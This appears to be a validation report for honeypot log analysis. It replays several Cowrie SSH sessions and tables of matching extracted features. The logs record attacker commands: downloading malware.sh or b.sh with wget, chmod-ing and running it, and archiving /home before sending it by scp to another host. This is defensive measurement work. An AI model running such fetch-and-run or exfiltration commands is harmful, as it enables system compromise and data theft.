# Manual source-event comparisons

## confirmation_task9 / e209f8a07f2f: botnet #2: wget to .example (DNS failure), chmod, ./malware.sh, exit

```
   0.000s  cowrie.session.connect                 
   0.007s  cowrie.client.version                  
   0.008s  cowrie.client.kex                      
   0.033s  cowrie.login.success                   
   0.066s  cowrie.client.size                     
   0.072s  cowrie.session.params                  
   2.563s  cowrie.command.input                   cd /tmp
  10.937s  cowrie.command.input                   shell
  10.938s  cowrie.command.failed                  shell 
  15.275s  cowrie.command.input                   wget http://mirror.example/malware.sh
  17.470s  cowrie.command.input                   chmod 777 malware.sh
  19.548s  cowrie.command.input                   ./malware.sh
  19.549s  cowrie.command.failed                  ./malware.sh 
  22.141s  cowrie.command.input                   exit
  22.144s  cowrie.log.closed                      853
  22.192s  cowrie.session.closed                  22.2
```

| feature | extracted | independent |
|---|---|---|
| login_success | 1 | 1 |
| login_failed_count | 0 | 0 |
| session_duration_s | 22.2 | 22.2 |
| input_line_count | 5 | 5 |
| input_bytes_total | 81 | 81 |
| input_line_max_bytes | 37.0 | 37.0 |
| unique_command_names | 5 | 5 |
| shell_operator_lines | 0 | 0 |
| download_command_lines | 1 | 1 |
| time_to_first_input_s | 2.53056 | 2.53056 |
| inter_input_mean_s | 4.24614925 | 4.24614925 |
| inter_input_std_s | 2.5471977433466346 | 2.5471977433466346 |
| tty_output_bytes | 853.0 | 853.0 |
| unknown_command_events | 2 | 2 |
| url_download_events | 0 | 0 |
| download_failed_events | 0 | 0 |
| redirect_write_events | 0 | 0 |
| scp_stdin_events | 0 | 0 |
| event_count | 16 | 16 |
| session_closed_observed | 1 | 1 |

Warnings: `none`. Differences: **0**.

## payload_pilot / 852266ae5622: pilot C: Cowrie-executed script line recorded as command.input; redirect write

```
   0.000s  cowrie.session.connect                 
   0.001s  cowrie.client.version                  
   0.004s  cowrie.client.kex                      
   0.061s  cowrie.login.success                   
   0.173s  cowrie.client.size                     
   0.178s  cowrie.session.params                  
   1.183s  cowrie.command.input                   echo PILOT_C_30457e89_line_from_script > /tmp/pilot_c.sh
   2.681s  cowrie.command.input                   sh /tmp/pilot_c.sh
   2.684s  cowrie.command.input                   PILOT_C_30457e89_line_from_script
   2.685s  cowrie.command.failed                  PILOT_C_30457e89_line_from_script 
   4.184s  cowrie.command.input                   exit
   4.186s  cowrie.session.file_download           /tmp/pilot_c.sh
   4.187s  cowrie.log.closed                      502
   6.187s  cowrie.session.closed                  6.2
```

| feature | extracted | independent |
|---|---|---|
| login_success | 1 | 1 |
| login_failed_count | 0 | 0 |
| session_duration_s | 6.2 | 6.2 |
| input_line_count | 3 | 3 |
| input_bytes_total | 107 | 107 |
| input_line_max_bytes | 56.0 | 56.0 |
| unique_command_names | 3 | 3 |
| shell_operator_lines | 1 | 1 |
| download_command_lines | 0 | 0 |
| time_to_first_input_s | 1.121859 | 1.121859 |
| inter_input_mean_s | 0.7505425 | 0.7505425 |
| inter_input_std_s | 0.7477904999999999 | 0.7477904999999999 |
| tty_output_bytes | 502.0 | 502.0 |
| unknown_command_events | 1 | 1 |
| url_download_events | 0 | 0 |
| download_failed_events | 0 | 0 |
| redirect_write_events | 1 | 1 |
| scp_stdin_events | 0 | 0 |
| event_count | 14 | 14 |
| session_closed_observed | 1 | 1 |

Warnings: `reserved_test_marker_present`. Differences: **0**.

## train_v1 / db3846f69175: downloaded HTML executed by Cowrie's sh; many command.failed; url download

```
   0.000s  cowrie.session.connect                 
   0.001s  cowrie.client.version                  
   0.005s  cowrie.client.kex                      
   0.051s  cowrie.login.success                   
   0.082s  cowrie.client.size                     
   0.086s  cowrie.session.params                  
   0.150s  cowrie.command.input                   shell
   0.151s  cowrie.command.failed                  shell 
   0.197s  cowrie.command.input                   cd /var/tmp
   0.273s  cowrie.command.input                   shell
   0.274s  cowrie.command.failed                  shell 
   0.385s  cowrie.command.input                   wget http://185.220.101.5/b.sh
   0.588s  cowrie.session.file_download           http://185.220.101.5/b.sh
   0.597s  cowrie.command.input                   sh b.sh
   0.599s  cowrie.command.input                   <html><head><meta http-equiv="Content-Type" content="text/ht
   0.602s  cowrie.command.failed                  min-height:300px 
   0.603s  cowrie.command.failed                  border:1px solid rgba(204,204,204,1)
   0.603s  cowrie.command.failed                  border-radius:6px 
   0.604s  cowrie.command.failed                  font-family:Tahoma,Arial,Verdana,sans-serif 
   0.605s  cowrie.command.failed                  box-sizing:border-box 
... 24 more ...
   0.631s  cowrie.command.failed                  box-sizing:border-box 
   0.632s  cowrie.command.failed                  width:100% 
   0.633s  cowrie.command.failed                  border-width:0px 
   0.634s  cowrie.command.failed                  font-weight:400 
   0.635s  cowrie.command.failed                  font-size:22px 
   0.636s  cowrie.command.failed                  color: 
   0.637s  cowrie.command.input                   rm b.sh
   0.664s  cowrie.command.input                   exit
   0.666s  cowrie.log.closed                      2767
   0.713s  cowrie.session.closed                  0.7
```

| feature | extracted | independent |
|---|---|---|
| login_success | 1 | 1 |
| login_failed_count | 0 | 0 |
| session_duration_s | 0.7 | 0.7 |
| input_line_count | 7 | 7 |
| input_bytes_total | 5670 | 5670 |
| input_line_max_bytes | 5605.0 | 5605.0 |
| unique_command_names | 6 | 6 |
| shell_operator_lines | 1 | 1 |
| download_command_lines | 1 | 1 |
| time_to_first_input_s | 0.098809 | 0.098809 |
| inter_input_mean_s | 0.08116483333333334 | 0.08116483333333334 |
| inter_input_std_s | 0.06772674524739511 | 0.06772674524739511 |
| tty_output_bytes | 2767.0 | 2767.0 |
| unknown_command_events | 37 | 37 |
| url_download_events | 1 | 1 |
| download_failed_events | 0 | 0 |
| redirect_write_events | 0 | 0 |
| scp_stdin_events | 0 | 0 |
| event_count | 54 | 54 |
| session_closed_observed | 1 | 1 |

Warnings: `tty_output_below_recorded_input_bytes`. Differences: **0**.

## eval_v1 / 446cba859695: first session with scp stdin events

```
   0.000s  cowrie.session.connect                 
   0.001s  cowrie.client.version                  
   0.005s  cowrie.client.kex                      
   0.061s  cowrie.login.success                   
   0.104s  cowrie.client.size                     
   0.108s  cowrie.session.params                  
   0.175s  cowrie.command.input                   find /home -name '*.db' 2>/dev/null
   0.373s  cowrie.command.input                   tar czf /var/tmp/d.tgz /home
   0.635s  cowrie.command.input                   scp /var/tmp/d.tar root@10.0.0.5:/tmp/
   0.732s  cowrie.session.file_download           exit
   0.752s  cowrie.log.closed                      648
   0.754s  cowrie.session.closed                  0.8
```

| feature | extracted | independent |
|---|---|---|
| login_success | 1 | 1 |
| login_failed_count | 0 | 0 |
| session_duration_s | 0.8 | 0.8 |
| input_line_count | 3 | 3 |
| input_bytes_total | 101 | 101 |
| input_line_max_bytes | 38.0 | 38.0 |
| unique_command_names | 3 | 3 |
| shell_operator_lines | 1 | 1 |
| download_command_lines | 1 | 1 |
| time_to_first_input_s | 0.113336 | 0.113336 |
| inter_input_mean_s | 0.2302375 | 0.2302375 |
| inter_input_std_s | 0.0322935 | 0.0322935 |
| tty_output_bytes | 648.0 | 648.0 |
| unknown_command_events | 0 | 0 |
| url_download_events | 0 | 0 |
| download_failed_events | 0 | 0 |
| redirect_write_events | 0 | 0 |
| scp_stdin_events | 1 | 1 |
| event_count | 12 | 12 |
| session_closed_observed | 1 | 1 |

Warnings: `none`. Differences: **0**.

## smoke_test_task7 / fa31b41fec41: task 7 botnet #2: wget to IP hung; download failed; no exit

```
   0.000s  cowrie.session.connect                 
   0.005s  cowrie.client.version                  
   0.007s  cowrie.client.kex                      
   0.070s  cowrie.login.success                   
   0.129s  cowrie.client.size                     
   0.137s  cowrie.session.params                  
   1.784s  cowrie.command.input                   cd /tmp
   5.057s  cowrie.command.input                   shell
   5.065s  cowrie.command.failed                  shell 
   5.707s  cowrie.command.input                   wget http://192.0.2.40/malware.sh
   6.151s  cowrie.session.file_download.failed    http://192.0.2.40/malware.sh
  25.717s  cowrie.log.closed                      569
  25.719s  cowrie.session.closed                  25.7
```

| feature | extracted | independent |
|---|---|---|
| login_success | 1 | 1 |
| login_failed_count | 0 | 0 |
| session_duration_s | 25.7 | 25.7 |
| input_line_count | 3 | 3 |
| input_bytes_total | 45 | 45 |
| input_line_max_bytes | 33.0 | 33.0 |
| unique_command_names | 3 | 3 |
| shell_operator_lines | 0 | 0 |
| download_command_lines | 1 | 1 |
| time_to_first_input_s | 1.713472 | 1.713472 |
| inter_input_mean_s | 1.96155 | 1.96155 |
| inter_input_std_s | 1.311486 | 1.311486 |
| tty_output_bytes | 569.0 | 569.0 |
| unknown_command_events | 1 | 1 |
| url_download_events | 0 | 0 |
| download_failed_events | 1 | 1 |
| redirect_write_events | 0 | 0 |
| scp_stdin_events | 0 | 0 |
| event_count | 13 | 13 |
| session_closed_observed | 1 | 1 |

Warnings: `none`. Differences: **0**.

## confirmation_task9 / 00499366e839: first failed-login-only session

```
   0.000s  cowrie.session.connect                 
   0.001s  cowrie.client.version                  
   0.006s  cowrie.client.kex                      
   0.069s  cowrie.login.failed                    
   1.079s  cowrie.session.closed                  1.1
```

| feature | extracted | independent |
|---|---|---|
| login_success | 0 | 0 |
| login_failed_count | 1 | 1 |
| session_duration_s | 1.1 | 1.1 |
| input_line_count | 0 | 0 |
| input_bytes_total | 0 | 0 |
| input_line_max_bytes | NaN | NaN |
| unique_command_names | 0 | 0 |
| shell_operator_lines | 0 | 0 |
| download_command_lines | 0 | 0 |
| time_to_first_input_s | NaN | NaN |
| inter_input_mean_s | NaN | NaN |
| inter_input_std_s | NaN | NaN |
| tty_output_bytes | 0.0 | 0.0 |
| unknown_command_events | 0 | 0 |
| url_download_events | 0 | 0 |
| download_failed_events | 0 | 0 |
| redirect_write_events | 0 | 0 |
| scp_stdin_events | 0 | 0 |
| event_count | 5 | 5 |
| session_closed_observed | 1 | 1 |

Warnings: `none`. Differences: **0**.

